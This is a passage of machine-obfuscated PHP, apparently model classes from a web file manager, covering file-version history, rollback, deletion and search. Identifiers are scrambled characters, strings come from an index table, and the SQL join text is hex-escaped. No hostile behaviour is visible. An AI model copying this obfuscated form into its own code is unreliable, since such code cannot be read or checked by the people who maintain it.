$GLOBALS[$¬©ŠÖÜö[6]][$¬©ŠÖÜö[89]][$¬©ŠÖÜö[1261]]; $ö’ˆ°öÜ = $äÉÉÓÚ£ == $¬©ŠÖÜö[1284] ? min(5, $Û²±ìê€) : $Û²±ìê€; $ö’ˆ°öÜ = $ö’ˆ°öÜ <= 0 ? 0 : $ö’ˆ°öÜ - 1; if ($ö’ˆ°öÜ >= 500) { return; } $÷®«í¯¤ = array($¬©ŠÖÜö[459] => $»’ùŒ¡Ê); $ çŠí–õ = $this->field($¬©ŠÖÜö[2134])->where($÷®«í¯¤)->order($¬©ŠÖÜö[2128])->select(); if (!$ çŠí–õ || $ö’ˆ°öÜ >= count($ çŠí–õ)) { return; } $½ÖşÑË = array_to_keyvalue($ çŠí–õ, $¬©ŠÖÜö[12], $¬©ŠÖÜö[443]); $½ÖşÑË = array_slice($½ÖşÑË, $ö’ˆ°öÜ); $›ß¥‚°Ş = array_to_keyvalue($ çŠí–õ, $¬©ŠÖÜö[12], $¬©ŠÖÜö[509]); $›ß¥‚°Ş = array_slice($›ß¥‚°Ş, $ö’ˆ°öÜ); if (!$½ÖşÑË || !$›ß¥‚°Ş) { return; } $÷®«í¯¤ = array($¬©ŠÖÜö[461] => array($¬©ŠÖÜö[7], $½ÖşÑË)); $this->where($÷®«í¯¤)->delete(); Model($¬©ŠÖÜö[512])->remove($›ß¥‚°Ş); } public function listData($°£”áÈ¡) { $ğÊøËÈ¢ =& $_SERVER[—ÌÒğš÷]; $Œ˜˜Á¤¦ = array($ğÊøËÈ¢[459] => $°£”áÈ¡); $ ÀÜ½«ï = $ğÊøËÈ¢[2135]; $‹ìŠÜ€â = $this->field($ ÀÜ½«ï)->where($Œ˜˜Á¤¦)->order($ğÊøËÈ¢[2128])->selectPage(); $this->_listAppendUser($‹ìŠÜ€â[$ğÊøËÈ¢[413]]); $ƒà”©µ‹ = Model($ğÊøËÈ¢[806])->get($ğÊøËÈ¢[1283]); $É¬™•¿” = 5; if ($ƒà”©µ‹ == $ğÊøËÈ¢[1284]) { $‹ìŠÜ€â[$ğÊøËÈ¢[413]] = array_slice($‹ìŠÜ€â[$ğÊøËÈ¢[413]], 0, $É¬™•¿”); $‹ìŠÜ€â[$ğÊøËÈ¢[410]] = array($ğÊøËÈ¢[2136] => 1, $ğÊøËÈ¢[2137] => 20, $ğÊøËÈ¢[2138] => 1, $ğÊøËÈ¢[2139] => count($‹ìŠÜ€â[$ğÊøËÈ¢[413]])); } return $‹ìŠÜ€â; } protected function _listAppendUser(&$ßıˆÑî) { $–é Ÿ• =& $_SERVER[—ÌÒğš÷]; $ŒÓ®ËÎ = array_to_keyvalue($ßıˆÑî, $–é Ÿ•[12], $–é Ÿ•[1688]); $İ©õ˜Ô = Model($–é Ÿ•[567])->userListInfo($ŒÓ®ËÎ); foreach ($ßıˆÑî as &$ıı†ŞÇÆ) { $£‰Œ¥® = $ıı†ŞÇÆ[$–é Ÿ•[1688]]; $ıı†ŞÇÆ[$–é Ÿ•[495]] = $İ©õ˜Ô[$£‰Œ¥®] ? $İ©õ˜Ô[$£‰Œ¥®] : !1; } unset($ıı†ŞÇÆ); } public function fileInfo($µ½½³‡î) { $Íæºäê =& $_SERVER[—ÌÒğš÷]; $£Â¢¸ıÃ = $this->tablePrefix; $€±ÏÃ¯‘ = "{$£Â¢¸ıÃ}\x69\157\x5f\x66\151\154\x65\40\146\151\154\x65\163\x20\x6f\x6e\x20\146\151\154\145\163\x2e\x66\151\x6c\x65\111\x44\x20\75\40\150\151\163\x74\157\x72\171\56\146\x69\x6c\145\111\x44"; return $this->alias($Íæºäê[2140])->where(array($Íæºäê[461] => $µ½½³‡î))->join($€±ÏÃ¯‘, $Íæºäê[2141])->find(); } public function removeItem($ÁÎÈ„şÖ) { $ÕÌ¦½‚Ğ =& $_SERVER[—ÌÒğš÷]; $îû£Öº• = array($ÕÌ¦½‚Ğ[461] => $ÁÎÈ„şÖ); $Â‚ëÒúŒ = $this->where($îû£Öº•)->find(); if ($Â‚ëÒúŒ) { $‚«Î£„ = $this->where($îû£Öº•)->delete(); Model($ÕÌ¦½‚Ğ[512])->remove($Â‚ëÒúŒ[$ÕÌ¦½‚Ğ[509]]); return $‚«Î£„; } return !1; } public function removeBySource($Ù¤Ñ…ùŞ) { $Ô÷‘€³ñ =& $_SERVER[—ÌÒğš÷]; if (!$Ù¤Ñ…ùŞ) { return !1; } if (!is_array($Ù¤Ñ…ùŞ)) { $Ù¤Ñ…ùŞ = array($Ù¤Ñ…ùŞ); } $±Í‹œˆ = array($Ô÷‘€³ñ[459] => array($Ô÷‘€³ñ[7], $Ù¤Ñ…ùŞ)); $¡Ó¿“ã— = $this->field($Ô÷‘€³ñ[510])->where($±Í‹œˆ)->select(); if ($¡Ó¿“ã—) { $this->where($±Í‹œˆ)->delete(); $Ö¡ËƒÛ’ = array_to_keyvalue($¡Ó¿“ã—, $Ô÷‘€³ñ[12], $Ô÷‘€³ñ[509]); Model($Ô÷‘€³ñ[512])->remove($Ö¡ËƒÛ’); } return !0; } public function setDetail($€æ‰ÓÚš, $àÀ—ƒ¦Ê) { $ßÃàôÁ =& $_SERVER[—ÌÒğš÷]; return $this->where(array($ßÃàôÁ[461] => $€æ‰ÓÚš))->save(array($ßÃàôÁ[2131] => $àÀ—ƒ¦Ê)); } public function rollbackToItem($ğ¡ó¿ßª, $åíŠÌº) { $˜ÃÇùµº =& $_SERVER[—ÌÒğš÷]; $¨ğ£îğİ = Model($˜ÃÇùµº[861])->sourceInfo($ğ¡ó¿ßª); $this->addHistory($¨ğ£îğİ, LNG($˜ÃÇùµº[2142])); $Îö£‚î = $this->find($åíŠÌº); $¼âÕí² = array($˜ÃÇùµº[509] => $Îö£‚î[$˜ÃÇùµº[509]], $˜ÃÇùµº[76] => $Îö£‚î[$˜ÃÇùµº[76]], $˜ÃÇùµº[85] => time(), $˜ÃÇùµº[497] => USER_ID); Model($˜ÃÇùµº[861])->where(array($˜ÃÇùµº[181] => $ğ¡ó¿ßª))->save($¼âÕí²); return $this->where(array($˜ÃÇùµº[461] => $åíŠÌº))->delete(); } public function clearSame($‘Ì¡º¿ƒ) { $‡ÌÒ®Ó =& $_SERVER[—ÌÒğš÷]; $˜¨ƒş = $this->listData($‘Ì¡º¿ƒ); $ãŞó×›ª = array_to_keyvalue_group($˜¨ƒş, $‡ÌÒ®Ó[509]); $Å¯Ñæ„ = array(); $½ªá•–¯ = array(); foreach ($ãŞó×›ª as $Ó§ŠÌÓ) { if (!$Ó§ŠÌÓ || count($Ó§ŠÌÓ) <= 1) { continue; } foreach ($Ó§ŠÌÓ as $¤ú”Áƒá) { $Å¯Ñæ„[] = $¤ú”Áƒá[$‡ÌÒ®Ó[509]]; $½ªá•–¯[] = $¤ú”Áƒá[$‡ÌÒ®Ó[443]]; } } if (!$½ªá•–¯) { return; } $this->where(array($‡ÌÒ®Ó[443] => array($‡ÌÒ®Ó[7], $½ªá•–¯)))->delete(); Model($‡ÌÒ®Ó[512])->remove($Å¯Ñæ„); } public function userSpace() { $çÜìÏ =& $_SERVER[—ÌÒğš÷]; $½ÏãÁ• = $this->tablePrefix; $·¡Ÿâïï = array($çÜìÏ[1679] => USER_ID); $¬¢ùê·½ = "{$½ÏãÁ•}\151\x6f\137\146\x69\x6c\x65\x20\146\151\x6c\145\163\40\157\x6e\40\146\151\154\145\163\56\x66\151\154\145\x49\x44\x20\x3d\x20\150\x69\x73\x74\x6f\162\x79\x2e\146\151\154\145\x49\104"; return $this->alias($çÜìÏ[2140])->where($·¡Ÿâïï)->join($¬¢ùê·½, $çÜìÏ[2141])->sum($çÜìÏ[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($×ÉğÍö) { $ŞûÆëÃ =& $_SERVER[—ÌÒğš÷]; $’ß¯ë®è = KodIO::fileTypeList(); $•á·¦²º = $’ß¯ë®è[$×ÉğÍö]; if (!$•á·¦²º) { return array(); } $ƒÑõáªç = $•á·¦²º[$ŞûÆëÃ[175]]; $ìËÍãÊÊ = $ŞûÆëÃ[7]; if (!$•á·¦²º[$ŞûÆëÃ[175]]) { $»œšé²ü = array_to_keyvalue($’ß¯ë®è, $ŞûÆëÃ[12], $ŞûÆëÃ[175]); $ƒÑõáªç = implode($ŞûÆëÃ[50], $»œšé²ü); $ìËÍãÊÊ = $ŞûÆëÃ[2143]; } $ü¹öÖî = explode($ŞûÆëÃ[50], trim($ƒÑõáªç, $ŞûÆëÃ[50])); return array($ìËÍãÊÊ, $ü¹öÖî); } public function listPathType($ßˆ°ÅÇ¨) { $ôû¬Ÿ÷İ =& $_SERVER[—ÌÒğš÷]; $ñúŒ•ŞÁ = $this->fileTypeWhere($ßˆ°ÅÇ¨); if (!$ñúŒ•ŞÁ) { return array(); } $Ìİ¾¢¡Û = USER_ID; $³ˆÓº® = Model($ôû¬Ÿ÷İ[567])->getInfo($Ìİ¾¢¡Û); $úë¼íÓÒ = array($ôû¬Ÿ÷İ[616] => SourceModel::TYPE_USER, $ôû¬Ÿ÷İ[553] => array($ôû¬Ÿ÷İ[580], $ôû¬Ÿ÷İ[563] . $³ˆÓº®[$ôû¬Ÿ÷İ[87]][$ôû¬Ÿ÷İ[181]] . $ôû¬Ÿ÷İ[581]), $ôû¬Ÿ÷İ[617] => $Ìİ¾¢¡Û, $ôû¬Ÿ÷İ[614] => 0, $ôû¬Ÿ÷İ[615] => $ñúŒ•ŞÁ); return $this->listSource($úë¼íÓÒ); } public function listSearch($û¤ Àä®, $İßÑ§ı“ = 300) { $›Õ¥ÚÒâ =& $_SERVER[—ÌÒğš÷]; if (isset($û¤ Àä®[$›Õ¥ÚÒâ[1981]]) && $û¤ Àä®[$›Õ¥ÚÒâ[1981]]) { $û¤ Àä®[$›Õ¥ÚÒâ[1981]] = str_replace($›Õ¥ÚÒâ[428], $›Õ¥ÚÒâ[2144], trim($û¤ Àä®[$›Õ¥ÚÒâ[1981]])); } $£¬éşŞ = $this->_parseSearchWhere($û¤ Àä®); if (!isset($£¬éşŞ[$›Õ¥ÚÒâ[473]])) { $£¬éşŞ[$›Õ¥ÚÒâ[473]] = 0; } $ê§îÙû¯ = $›Õ¥ÚÒâ[2145]; $ìœùè÷§ = $£¬éşŞ; $¦®â«ğ« = $ê§îÙû¯; $this->_listSearchBindPinyin($û¤ Àä®, $£¬éşŞ, $ê§îÙû¯); $this->alias($›Õ¥ÚÒâ[487])->_makeOrder(); $£¬éşŞ = $this->parseWhereLike($£¬éşŞ); $â»Äõ—ş = $this->distinct(!0)->field($ê§îÙû¯)->where($£¬éşŞ)->selectPage($İßÑ§ı“); if ($GLOBALS[$›Õ¥ÚÒâ[6]][$›Õ¥ÚÒâ[425]][$›Õ¥ÚÒâ[426]] && Input::check($û¤ Àä®[$›Õ¥ÚÒâ[1981]], $›Õ¥ÚÒâ[623]) && $â»Äõ—ş[$›Õ¥ÚÒâ[410]][$›Õ¥ÚÒâ[397]] == 1 && $â»Äõ—ş[$›Õ¥ÚÒâ[410]][$›Õ¥ÚÒâ[411]] == 0) { $â»Äõ—ş = $this->distinct(!0)->field($ê§îÙû¯)->where($ìœùè÷§)->limit(1000)->select(); $â»Äõ—ş = array_page_split($â»Äõ—ş, !1, $İßÑ§ı“); } $this->_listSearchFileContent($â»Äõ—ş, $û¤ Àä®, $¦®â«ğ«, $ìœùè÷§); $this->_listSearchDesc($â»Äõ—ş, $û¤ Àä®, $¦®â«ğ«); $this->_listSearchTag($â»Äõ—ş, $û¤ Àä®, $¦®â«ğ«); $this->_listSearchGroupTag($â»Äõ—ş, $û¤ Àä®, $¦®â«ğ«); $this->_listDataApply($â»Äõ—ş[$›Õ¥ÚÒâ[413]]); $this->_listMake($â»Äõ—ş); return $â»Äõ—ş; } private function _listSearchFileContent(&$»¤°Ÿ£ò, $èË´¯¨, $ºĞ‰î§­, $‘ëÆ˜Ó€) { $İœ³‡İÌ =& $_SERVER[—ÌÒğš÷]; if (!$èË´¯¨[$İœ³‡İÌ[1981]] || $»¤°Ÿ£ò[$İœ³‡İÌ[410]][$İœ³‡İÌ[397]] > 1) { return; } if (!isset($‘ëÆ˜Ó€[$İœ³‡İÌ[32]]) || !is_array($èË´¯¨[$İœ³‡İÌ[509]])) { return; } $‘ëÆ˜Ó€[$İœ³‡İÌ[509]] = array($İœ³‡İÌ[7], $èË´¯¨[$İœ³‡İÌ[509]]); unset($‘ëÆ˜Ó€[$İœ³‡İÌ[32]]); unset($èË´¯¨[$İœ³‡İÌ[509]]); $¸«Ÿ³àı = $this->field($ºĞ‰î§­)->where($‘ëÆ˜Ó€)->limit($İœ³‡İÌ[2146])->select(); if (!$¸«Ÿ³àı || count($¸«Ÿ³àı) == 0) { return; } $»¤°Ÿ£ò[$İœ³‡İÌ[413]] = array_merge($¸«Ÿ³àı, $»¤°Ÿ£ò[$İœ³‡İÌ[413]]); $»¤°Ÿ£ò[$İœ³‡İÌ[410]][$İœ³‡İÌ[411]] += count($¸«Ÿ³àı); } private function _listSearchTag(&$Ò –×òÌ, $Ú‘ªõÙË, $²çĞìó¼) { $Áß¢± =& $_SERVER[—ÌÒğš÷]; if (!$Ú‘ªõÙË[$Áß¢±[1981]] || $Ò –×òÌ[$Áß¢±[410]][$Áß¢±[397]] > 1) { return; } $üœ¬¡áÕ = Model($Áß¢±[2147])->listData(); $…é“ôæš = array(); $¢»Öáñ = $Ú‘ªõÙË[$Áß¢±[1981]]; foreach ($üœ¬¡áÕ as $õ†îÏŒË) { $ÛëÍ°« = $õ†îÏŒË[$Áß¢±[32]]; $•µÒŒ…¥ = str_replace($Áß¢±[53], $Áß¢±[12], Pinyin::get($ÛëÍ°«)); if (stripos($ÛëÍ°«, $¢»Öáñ) !== !1 || stripos($•µÒŒ…¥, $¢»Öáñ) !== !1) { $…é“ôæš[] = $õ†îÏŒË[$Áß¢±[443]]; } } if (!$…é“ôæš) { return; } $’ŞãÆà = array($Áß¢±[468] => array($Áß¢±[7], $…é“ôæš), $Áß¢±[1688] => USER_ID); $ãšİ‡ó¸ = Model($Áß¢±[470])->field($Áß¢±[84])->where($’ŞãÆà)->select(); $ãšİ‡ó¸ = array_to_keyvalue($ãšİ‡ó¸, $Áß¢±[12], $Áß¢±[84]); $ã³§Ü¶ù = array_unique($ãšİ‡ó¸); $this->_listSearchMerge($Ò –×òÌ, $Ú‘ªõÙË, $²çĞìó¼, $ã³§Ü¶ù); } private function _listSearchDesc(&$ÉµÈø©ç, $«ÕõÒ©, $°¹ÌåÕ©) { $êì¥æŠ =& $_SERVER[—ÌÒğš÷]; if (!$«ÕõÒ©[$êì¥æŠ[1981]] || $ÉµÈø©ç[$êì¥æŠ[410]][$êì¥æŠ[397]] > 1) { return; } $°øúªÁ = array($êì¥æŠ[94] => $êì¥æŠ[494], $êì¥æŠ[418] => array($êì¥æŠ[427], $êì¥æŠ[1983] . $«ÕõÒ©[$êì¥æŠ[1981]] . $êì¥æŠ[1983])); $¢ŒĞêøö = !1; if ($¢ŒĞêøö) { $±—ı‚Ôâ = $this->listSearchChildren($«ÕõÒ©[$êì¥æŠ[180]]); $±—ı‚Ôâ = array_unique($±—ı‚Ôâ); if (!$±—ı‚Ôâ) { return; } $°øúªÁ[$êì¥æŠ[181]] = array($êì¥æŠ[7], $±—ı‚Ôâ); } $ëãÈš¹ó = Model($êì¥æŠ[600])->field($êì¥æŠ[181])->where($°øúªÁ)->limit(5000)->select(); $Øè‘×òÄ = array_to_keyvalue($ëãÈš¹ó, $êì¥æŠ[12], $êì¥æŠ[181]); $this->_listSearchMerge($ÉµÈø©ç, $«ÕõÒ©, $°¹ÌåÕ©, $Øè‘×òÄ); } private function _listSearchGroupTag(&$¢˜÷„«à, $“éâ‡®Ù, $®‹±éàË) { $‰³ïœ›à =& $_SERVER[—ÌÒğš÷]; if (!$“éâ‡®Ù[$‰³ïœ›à[1981]] || $¢˜÷„«à[$‰³ïœ›à[410]][$‰³ïœ›à[397]] > 1 || !$“éâ‡®Ù[$‰³ïœ›à[180]]) { return; } $Û²™İ = $this->sourceInfo($“éâ‡®Ù[$‰³ïœ›à[180]]); if (!$Û²™İ || $Û²™İ[$‰³ïœ›à[178]] != SourceModel::TYPE_GROUP) { return; } $µ¶ğö¹í = $Û²™İ[$‰³ïœ›à[538]]; $š²õÌ”” = Model($‰³ïœ›à[2148])->get($µ¶ğö¹í); $ç°”’ó = array(); $”œı¨õû = $“éâ‡®Ù[$‰³ïœ›à[1981]]; foreach ($š²õÌ””[$‰³ïœ›à[413]] as $²††²÷³) { $®Ú³Ï¼Ö = $²††²÷³[$‰³ïœ›à[32]]; $”Éò¿“ì = str_replace($‰³ïœ›à[53], $‰³ïœ›à[12], Pinyin::get($®Ú³Ï¼Ö)); if (stripos($®Ú³Ï¼Ö, $”œı¨õû) !== !1 || stripos($”Éò¿“ì, $”œı¨õû) !== !1) { $ç°”’ó[] = $²††²÷³[$‰³ïœ›à[443]]; } } if (!$ç°”’ó) { return; } $ş‹±¸€¾ = array($‰³ïœ›à[468] => array($‰³ïœ›à[7], $ç°”’ó), $‰³ïœ›à[1688] => 0, $‰³ïœ›à[33] => $‰³ïœ›à[2003] . $µ¶ğö¹í); $áÂ€™´ = Model($‰³ïœ›à[470])->field($‰³ïœ›à[84])->where($ş‹±¸€¾)->select(); $áÂ€™´ = array_to_keyvalue($áÂ€™´, $‰³ïœ›à[12], $‰³ïœ›à[84]); $×µÛõ¯ = array_unique($áÂ€™´); $this->_listSearchMerge($¢˜÷„«à, $“éâ‡®Ù, $®‹±éàË, $×µÛõ¯); } private function _listSearchMerge(&$óĞùú«“, $òª±³É, $Â‰Ûï´ş, $„½¾ğË‰) { $Å‹ËÂã¨ =& $_SERVER[—ÌÒğš÷]; if (!$„½¾ğË‰) { return; } $¹šÖÔš« = array_to_keyvalue($óĞùú«“[$Å‹ËÂã¨[413]], $Å‹ËÂã¨[12], $Å‹ËÂã¨[181]); $–„·è¨ = array_diff($„½¾ğË‰, $¹šÖÔš«); if (!$–„·è¨) { return; } $Íıõş¦à = array($Å‹ËÂã¨[181] => array($Å‹ËÂã¨[7], $–„·è¨)); $ÒŸ€ÂŠ˜ = $this->field($Â‰Ûï´ş)->where($Íıõş¦à)->select(); if (!$ÒŸ€ÂŠ˜) { return; } $ÙŞÂ’¾î = array(); foreach ($ÒŸ€ÂŠ˜ as $óğñ†Òş) { if ($this->_listSearchFilter($óğñ†Òş, $òª±³É)) { $ÙŞÂ’¾î[] = $óğñ†Òş; } } $óĞùú«“[$Å‹ËÂã¨[413]] = array_merge($ÙŞÂ’¾î, $óĞùú«“[$Å‹ËÂã¨[413]]); $óĞùú«“[$Å‹ËÂã¨[410]][$Å‹ËÂã¨[411]] += count($ÙŞÂ’¾î); } private function _listSearchFilter($û°ãİå, $€şÏæ‚µ) { $ÜÅƒ¯ëİ =& $_SERVER[—ÌÒğš÷]; $ã…¹ò—‡ = $û°ãİå[$ÜÅƒ¯ëİ[453]] == $ÜÅƒ¯ëİ[88]; if (!strstr($û°ãİå[$ÜÅƒ¯ëİ[553]], $ÜÅƒ¯ëİ[50] . $€şÏæ‚µ[$ÜÅƒ¯ëİ[180]] . $ÜÅƒ¯ëİ[50])) { return !1; } if (isset($€şÏæ‚µ[$ÜÅƒ¯ëİ[454]]) && $€şÏæ‚µ[$ÜÅƒ¯ëİ[454]] != $ÜÅƒ¯ëİ[1942]) { if ($€şÏæ‚µ[$ÜÅƒ¯ëİ[454]] == $ÜÅƒ¯ëİ[75] && !$ã…¹ò—‡) { return !1; } if ($€şÏæ‚µ[$ÜÅƒ¯ëİ[454]] != $ÜÅƒ¯ëİ[75] && $ã…¹ò—‡) { return !1; } if (!strstr($û°ãİå[$ÜÅƒ¯ëİ[175]], $ÜÅƒ¯ëİ[50] . $€şÏæ‚µ[$ÜÅƒ¯ëİ[454]] . $ÜÅƒ¯ëİ[50])) { return !1; } } if (isset($€şÏæ‚µ[$ÜÅƒ¯ëİ[2149]]) && $€şÏæ‚µ[$ÜÅƒ¯ëİ[2149]] < $û°ãİå[$ÜÅƒ¯ëİ[76]]) { return !1; } if (isset($€şÏæ‚µ[$ÜÅƒ¯ëİ[2150]]) && $€şÏæ‚µ[$ÜÅƒ¯ëİ[2150]] > $û°ãİå[$ÜÅƒ¯ëİ[76]]) { return !1; } if (isset($€şÏæ‚µ[$ÜÅƒ¯ëİ[630]]) && $€şÏæ‚µ[$ÜÅƒ¯ëİ[630]] != $û°ãİå[$ÜÅƒ¯ëİ[497]]) { return !1; } return !0; } public function listSearchChildren($‡è¸˜ıß, $¨¸±áÒ® = 5000) { $Ù—·è÷ä =& $_SERVER[—ÌÒğš÷]; $„ÁøÅ‰‰ = array(); $”âÑòˆ¿ = $this->sourceInfo($‡è¸˜ıß); $ö€ï…Š° = array($Ù—·è÷ä[553] => array($Ù—·è÷ä[427], $”âÑòˆ¿[$Ù—·è÷ä[553]] . $”âÑòˆ¿[$Ù—·è÷ä[181]] . $Ù—·è÷ä[581])); $İÔæÖŸÈ = $this->field($Ù—·è÷ä[76])->where($ö€ï…Š°)->limit($¨¸±áÒ® + 1)->select(); $í²İ…Õä = is_array($İÔæÖŸÈ) ? count($İÔæÖŸÈ) : 0; if ($í²İ…Õä > $¨¸±áÒ®) { return $this->_listSearchChildrenNear($‡è¸˜ıß, $¨¸±áÒ®); } $ÅæÓ•’¶ = $this->field($Ù—·è÷ä[181])->where($ö€ï…Š°)->select(); $„ÁøÅ‰‰ = array_to_keyvalue($ÅæÓ•’¶, $Ù—·è÷ä[12], $Ù—·è÷ä[181]); return $„ÁøÅ‰‰; } private function _listSearchChildrenNear($œ¶İç¯, $¾Ì´Ìù½) { $âé¯øşğ =& $_SERVER[—ÌÒğš÷]; $¥Â˜„Â” = array(); $Ï§—æ«ç = array($âé¯øşğ[180] => $œ¶İç¯); $á¹üâ”’ = $this->field($âé¯øşğ[2151])->where($Ï§—æ«ç)->select(); $¥Úë¦„Û = array_to_keyvalue(array_filter_by_field($á¹üâ”’, $âé¯øşğ[453], $âé¯øşğ[88]), $âé¯øşğ[12], $âé¯øşğ[181]); $¥Â˜„Â” = array_merge($¥Â˜„Â”, array_to_keyvalue($á¹üâ”’, $âé¯øşğ[12], $âé¯øşğ[181])); if (!$¥Úë¦„Û) { return $¥Â˜„Â”; } $Ï§—æ«ç = array($âé¯øşğ[180] => array($âé¯øşğ[7], $¥Úë¦„Û)); $á¹üâ”’ = $this->field($âé¯øşğ[2151])->where($Ï§—æ«ç)->limit($¾Ì´Ìù½)->select(); $¥Â˜„Â” = array_merge($¥Â˜„Â”, array_to_keyvalue($á¹üâ”’, $âé¯øşğ[12], $âé¯øşğ[181])); $¥Â˜„Â” = array_slice($¥Â˜„Â”, 0, $¾Ì´Ìù½); return $¥Â˜„Â”; } private function _listSearchBindPinyin($îÄ×¬ğË, &$ËŒ‰˜Òõ, &$¯ú…íÛÕ) { $²½¿÷ŒÇ =& $_SERVER[—ÌÒğš÷]; if (!isset($îÄ×¬ğË[$²½¿÷ŒÇ[1981]]) || !$îÄ×¬ğË[$²½¿÷ŒÇ[1981]]) { return; } if (!Input::check($îÄ×¬ğË[$²½¿÷ŒÇ[1981]], $²½¿÷ŒÇ[362]) || strlen($îÄ×¬ğË[$²½¿÷ŒÇ[1981]]) < 2) { return; } $ëÇŠÆşÚ = "\x4c\105\x46\124\x20\112\117\111\116\x20{$this->tablePrefix}\x69\157\137\163\x6f\x75\162\x63\145\137\x6d\145\x74\x61\40\x6d\145\164\x61\x20\157\156\40\x73\x6f\x75\162\143\145\56\x73\x6f\165\x72\x63\x65\x49\x44\40\75\x20\x6d\x65\x74\x61\56\x73\x6f\165\162\143\x65\111\x44"; $¯‚×Äı¾ = array(); $¯ú…íÛÕ = str_replace(array($²½¿÷ŒÇ[246], $²½¿÷ŒÇ[53], $²½¿÷ŒÇ[2152]), $²½¿÷ŒÇ[12], $¯ú…íÛÕ); $¯ú…íÛÕ = $²½¿÷ŒÇ[479] . str_replace($²½¿÷ŒÇ[50], $²½¿÷ŒÇ[480], $¯ú…íÛÕ); $°ñòŞ‡ = $ËŒ‰˜Òõ[$²½¿÷ŒÇ[32]]; unset($ËŒ‰˜Òõ[$²½¿÷ŒÇ[32]]); foreach ($ËŒ‰˜Òõ as $½ª¦Ş© => $·öµ²õè) { $¯‚×Äı¾[$²½¿÷ŒÇ[479] . $½ª¦Ş©] = $·öµ²õè; } foreach ($°ñòŞ‡ as $–±Ñá¿¾) { $¯‚×Äı¾[] = array($²½¿÷ŒÇ[484] => $–±Ñá¿¾, $²½¿÷ŒÇ[1044] => $²½¿÷ŒÇ[1985], array($²½¿÷ŒÇ[2153] => $–±Ñá¿¾, $²½¿÷ŒÇ[2154] => array($²½¿÷ŒÇ[7], array($²½¿÷ŒÇ[506], $²½¿÷ŒÇ[505])))); } $this->join($ëÇŠÆşÚ); $ËŒ‰˜Òõ = $¯‚×Äı¾; } private function _parseSearchWhere($–êÎ­Ôô) { $÷™­ªÂŸ =& $_SERVER[—ÌÒğš÷]; $Éú¿à”œ = array(); if (isset($–êÎ­Ôô[$÷™­ªÂŸ[796]]) && $–êÎ­Ôô[$÷™­ªÂŸ[796]]) { $Éú¿à”œ[$÷™­ªÂŸ[85]] = array($÷™­ªÂŸ[2155], $–êÎ­Ôô[$÷™­ªÂŸ[796]]); } if (isset($–êÎ­Ôô[$÷™­ªÂŸ[797]]) && $–êÎ­Ôô[$÷™­ªÂŸ[797]]) { $ ¾Ê¡å× = array($÷™­ªÂŸ[2156], $–êÎ­Ôô[$÷™­ªÂŸ[797]]); if ($Éú¿à”œ[$÷™­ªÂŸ[85]]) { $Éú¿à”œ[$÷™­ªÂŸ[85]] = array($Éú¿à”œ[$÷™­ªÂŸ[85]], $ ¾Ê¡å×, $÷™­ªÂŸ[2157]); } else { $Éú¿à”œ[$÷™­ªÂŸ[85]] = $ ¾Ê¡å×; } } if (isset($–êÎ­Ôô[$÷™­ªÂŸ[2149]]) && $–êÎ­Ôô[$÷™­ªÂŸ[2149]] > 0) { $Éú¿à”œ[$÷™­ªÂŸ[76]] = array($÷™­ªÂŸ[2155], $–êÎ­Ôô[$÷™­ªÂŸ[2149]]); } if (isset($–êÎ­Ôô[$÷™­ªÂŸ[2150]]) && $–êÎ­Ôô[$÷™­ªÂŸ[2150]]) { $ ¾Ê¡å× = array($÷™­ªÂŸ[2156], $–êÎ­Ôô[$÷™­ªÂŸ[2150]]); if ($Éú¿à”œ[$÷™­ªÂŸ[76]]) { $Éú¿à”œ[$÷™­ªÂŸ[76]] = array($Éú¿à”œ[$÷™­ªÂŸ[76]], $ ¾Ê¡å×, $÷™­ªÂŸ[2157]); } else { $Éú¿à”œ[$÷™­ªÂŸ[76]] = $ ¾Ê¡å×; } } if (isset($–êÎ­Ôô[$÷™­ªÂŸ[630]]) && $–êÎ­Ôô[$÷™­ªÂŸ[630]]) { $Éú¿à”œ[] = array($÷™­ªÂŸ[497] => $–êÎ­Ôô[$÷™­ªÂŸ[630]], $÷™­ªÂŸ[495] => $–êÎ­Ôô[$÷™­ªÂŸ[630]], $÷™­ªÂŸ[1044] => $÷™­ªÂŸ[1985]); } if (isset($–êÎ­Ôô[$÷™­ªÂŸ[454]]) && $–êÎ­Ôô[$÷™­ªÂŸ[454]]) { $ÍŞ¢ÃûÜ = $–êÎ­Ôô[$÷™­ªÂŸ[454]]; if ($ÍŞ¢ÃûÜ == $÷™­ªÂŸ[75]) { $Éú¿à”œ[$÷™­ªÂŸ[453]] = 1; } else { if ($ÍŞ¢ÃûÜ == $÷™­ªÂŸ[2158]) { $Éú¿à”œ[$÷™­ªÂŸ[453]] = 0; } else { if ($ÍŞ¢ÃûÜ) { $ÍŞ¢ÃûÜ = is_array($ÍŞ¢ÃûÜ) ? $ÍŞ¢ÃûÜ : explode($÷™­ªÂŸ[50], $ÍŞ¢ÃûÜ); $Éú¿à”œ[$÷™­ªÂŸ[454]] = array($÷™­ªÂŸ[460], $ÍŞ¢ÃûÜ); $Éú¿à”œ[$÷™­ªÂŸ[453]] = 0; } } } } $this->_parseSearchParent($–êÎ­Ôô, $Éú¿à”œ); if (isset($–êÎ­Ôô[$÷™­ªÂŸ[1981]]) && trim($–êÎ­Ôô[$÷™­ªÂŸ[1981]])) { $ößÌšÉˆ = trim($–êÎ­Ôô[$÷™­ªÂŸ[1981]]); $¬œ¥¦ = explode($÷™­ªÂŸ[53], $ößÌšÉˆ); if (strlen($ößÌšÉˆ) > 2 && (substr($ößÌšÉˆ, 0, 1) == $÷™­ªÂŸ[118] && substr($ößÌšÉˆ, -1) == $÷™­ªÂŸ[118]) || substr($ößÌšÉˆ, 0, 1) == $÷™­ªÂŸ[58] && substr($ößÌšÉˆ, -1) == $÷™­ªÂŸ[58]) { $ößÌšÉˆ = substr($ößÌšÉˆ, 1, -1); $¬œ¥¦ = array($ößÌšÉˆ); } $Éú¿à”œ[$÷™­ªÂŸ[32]] = array(array($÷™­ªÂŸ[580], $÷™­ªÂŸ[1983] . $ößÌšÉˆ . $÷™­ªÂŸ[1983])); if (count($¬œ¥¦) > 1) { $Éú¿à”œ[$÷™­ªÂŸ[32]] = array(); foreach ($¬œ¥¦ as $«–¤„·) { if (!trim($«–¤„·)) { continue; } $Éú¿à”œ[$÷™­ªÂŸ[32]][] = array($÷™­ªÂŸ[580], $÷™­ªÂŸ[1983] . trim($«–¤„·) . $÷™­ªÂŸ[1983]); } } } return $Éú¿à”œ; } private function _parseSearchParent($êö¡é£Ğ, &$ËÒ×ü·’) { $áÖ¯ï£« =& $_SERVER[—ÌÒğš÷]; if (!isset($êö¡é£Ğ[$áÖ¯ï£«[180]]) || !$êö¡é£Ğ[$áÖ¯ï£«[180]]) { 